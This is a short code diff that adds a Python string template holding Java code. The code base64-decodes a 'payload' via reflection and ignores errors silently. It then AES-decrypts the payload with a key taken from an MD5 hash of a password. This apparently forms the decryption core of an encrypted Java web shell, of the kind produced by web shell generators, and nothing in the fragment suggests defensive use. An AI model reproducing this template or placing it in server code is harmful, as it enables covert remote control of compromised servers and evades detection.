@@ -30,3 +30,37 @@ code = """
         );
     }
 """
+
+proc = """
+            Class base64;
+            Object decoder;
+            byte[] bytes = null;
+            java.security.MessageDigest h;
+            javax.crypto.Cipher c;
+
+            try {
+                base64 = Class.forName("java.util.Base64");
+                decoder = base64.getMethod("getDecoder")
+                    .invoke(base64);
+                bytes = (byte[]) decoder.getClass()
+                    .getMethod("decode", String.class)
+                    .invoke(decoder, payload);
+            } catch (ClassNotFoundException e) {
+                try {
+                    base64 = Class.forName("sun.misc.BASE64Decoder");
+                    decoder = base64.newInstance();
+                    bytes = (byte[]) decoder.getClass()
+                        .getMethod("decodeBuffer", String.class)
+                        .invoke(decoder, payload);
+                } catch (Exception ex) {}
+            } catch (Exception ex) {}
+
+            h = java.security.MessageDigest.getInstance("MD5");
+            h.update(password.getBytes(), 0, password.length());
+            byte[] key = new BigInteger(1, h.digest()).toString(16)
+                .substring(0, 16).getBytes();
+
+            c = javax.crypto.Cipher.getInstance("AES");
+            c.init(2, new javax.crypto.spec.SecretKeySpec(key, "AES"));
+            bytes = c.doFinal(bytes);
+"""
